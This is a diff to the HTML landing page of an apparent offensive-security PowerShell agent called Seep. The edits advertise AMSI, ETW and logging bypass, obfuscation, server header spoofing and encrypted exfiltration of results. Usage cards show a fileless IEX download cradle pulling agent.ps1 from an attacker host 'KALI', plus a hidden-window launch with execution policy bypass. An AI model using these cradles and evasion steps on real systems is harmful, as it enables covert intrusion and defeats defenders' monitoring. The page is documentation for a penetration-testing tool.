@@ -990,7 +990,7 @@
       <div class="feature-card">
         <span class="feature-icon" aria-hidden="true">&#128171;</span>
         <h3>Fileless Agent</h3>
-        <p>IEX cradle downloads and executes in memory. Results are GZip-compressed and uploaded over HTTP. Zero disk footprint on the target.</p>
+        <p>IEX cradle downloads and executes in memory. AMSI, ETW, and Script Block Logging bypassed automatically. Results AES-256-CBC encrypted and uploaded. Zero disk footprint.</p>
       </div>
 
       <div class="feature-card">
@@ -1020,13 +1020,13 @@
       <div class="feature-card">
         <span class="feature-icon" aria-hidden="true">&#9881;</span>
         <h3>Modular Composer</h3>
-        <p>Cherry-pick checks with <code style="font-size:12px;color:var(--ctp-teal);background:var(--ctp-surface0);padding:1px 5px;border-radius:3px;">--checks</code> / <code style="font-size:12px;color:var(--ctp-teal);background:var(--ctp-surface0);padding:1px 5px;border-radius:3px;">--exclude</code>. Apply string obfuscation. Strip comments. One composable agent.</p>
+        <p>Cherry-pick checks with <code style="font-size:12px;color:var(--ctp-teal);background:var(--ctp-surface0);padding:1px 5px;border-radius:3px;">--checks</code> / <code style="font-size:12px;color:var(--ctp-teal);background:var(--ctp-surface0);padding:1px 5px;border-radius:3px;">--exclude</code>. Apply identifier randomization with <code style="font-size:12px;color:var(--ctp-teal);background:var(--ctp-surface0);padding:1px 5px;border-radius:3px;">--obfuscate</code> &mdash; function names, variables, headers all randomized. Auto-invoke when auth configured.</p>
       </div>
 
       <div class="feature-card">
         <span class="feature-icon" aria-hidden="true">&#128274;</span>
         <h3>TLS &amp; Hardened Server</h3>
-        <p>Self-signed HTTPS, upload size limits, decompression bomb protection, XSS-safe HTML, path traversal guards, and CSP headers.</p>
+        <p>Auth-gated endpoints (404 on failure), IIS/10.0 header spoofing, AES-encrypted uploads, random TLS CN, URL prefix support, decompression bomb protection, and CSP headers.</p>
       </div>
 
       <div class="feature-card">
@@ -1167,7 +1167,7 @@
               <h3>Agent Composer</h3>
             </div>
             <p>
-              Assembles 16 independent PowerShell modules into a single <code>.ps1</code> agent. Select checks with <code>--checks</code>, apply obfuscation with <code>--obfuscate</code>, strip comments for stealth.
+              Assembles 16 independent PowerShell modules into a single <code>.ps1</code> agent with AMSI/ETW/SBL bypass. Select checks with <code>--checks</code>, apply identifier randomization with <code>--obfuscate</code>, auto-invoke with embedded auth.
             </p>
           </div>
 
@@ -1177,7 +1177,7 @@
               <h3>HTTP Server</h3>
             </div>
             <p>
-              Stdlib <code>http.server</code> &mdash; no Flask, no FastAPI. Serves the agent on GET, receives compressed results on POST. Optional self-signed TLS with path confinement.
+              Stdlib <code>http.server</code> &mdash; no Flask, no FastAPI. Auth-gated agent delivery, AES-256-CBC encrypted result upload, IIS/10.0 header spoofing, random TLS CN, and URL prefix support.
             </p>
           </div>
 
@@ -1187,7 +1187,7 @@
               <h3>Results Parser</h3>
             </div>
             <p>
-              Accepts JSON, ZIP, and GZip uploads. 50MB upload limit, 200MB decompression limit. Schema validation, decompression bomb protection, and path traversal guards.
+              Accepts AES-256-CBC encrypted, GZip, ZIP, and JSON uploads. 50MB upload limit, 200MB decompression limit. Schema validation, decompression bomb protection, and path traversal guards.
             </p>
           </div>
 
@@ -1210,6 +1210,7 @@
           <span>argparse</span>
           <span>http.server</span>
           <span>pyyaml</span>
+          <span>cryptography</span>
           <span>ThreadPoolExecutor</span>
           <span>OpenSSL</span>
         </div>
@@ -1229,8 +1230,8 @@
       <div class="usage-card">
         <div class="usage-card-header">Fileless Execution</div>
         <div class="usage-card-body">
-          <div class="start-line"><span class="prompt">PS&gt;</span> <span class="cmd">IEX</span><span class="arg">(New-Object Net.WebClient)</span><span class="cmd">.DownloadString(</span><span class="arg">'http://KALI/agent.ps1'</span><span class="cmd">)</span></div>
-          <div class="start-line"><span class="prompt">PS&gt;</span> <span class="cmd">Invoke-Seep</span></div>
+          <div class="start-line"><span class="prompt">PS&gt;</span> <span class="cmd">IEX</span><span class="arg">(New-Object Net.WebClient)</span><span class="cmd">.DownloadString(</span><span class="arg">'http://KALI/agent.ps1?token=T'</span><span class="cmd">)</span></div>
+          <div class="start-line"><span class="comment"># Agent auto-invokes with embedded token</span></div>
         </div>
       </div>
       <div class="usage-card">
@@ -1256,7 +1257,7 @@
       <div class="usage-card">
         <div class="usage-card-header">Stealth Mode</div>
         <div class="usage-card-body">
-          <div class="start-line"><span class="prompt">PS&gt;</span> <span class="cmd">powershell</span> <span class="flag">-ep bypass -NoP -W Hidden</span> <span class="flag">-c</span> <span class="arg">"IEX(...); Invoke-Seep"</span></div>
+          <div class="start-line"><span class="prompt">PS&gt;</span> <span class="cmd">powershell</span> <span class="flag">-ep bypass -NoP -W Hidden</span> <span class="flag">-c</span> <span class="arg">"IEX(...agent.ps1?token=T...)"</span></div>
         </div>
       </div>
       <div class="usage-card">
@@ -1323,7 +1324,7 @@
           <strong style="color:var(--ctp-text);">seep init</strong> creates the workspace directory structure &mdash; config, results directory, and tool storage. Everything is isolated per engagement.
         </p>
         <p>
-          <strong style="color:var(--ctp-text);">seep serve</strong> starts an HTTP server that delivers the agent on <code>GET /agent.ps1</code> and receives compressed results on <code>POST /upload</code>. Add <code>--tls</code> for HTTPS.
+          <strong style="color:var(--ctp-text);">seep serve</strong> starts an HTTP server with auth-gated agent delivery, AES-encrypted result upload, and IIS header spoofing. Prints ready-to-use cradles with auth tokens on startup. Add <code>--tls</code> for HTTPS.
         </p>
       </div>
     </div>
